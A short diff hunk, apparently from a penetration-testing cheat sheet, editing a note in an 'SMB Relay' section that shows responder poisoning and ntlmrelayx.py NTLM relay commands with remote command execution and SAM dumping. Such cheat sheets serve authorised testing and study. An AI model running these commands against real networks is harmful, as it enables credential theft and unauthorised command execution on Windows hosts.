@@ -823,7 +823,7 @@ SMB Relay
 ```
 responder -I  NETINTERFACE -dw
 ```
-NTLM Relay [responder.conf con smb y http en "off" (SAM dumping without 'c' flag)]
+NTLM Relay [responder.conf con smb y http en "off" (SAM dumping without '-c')]
 
 ```
 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
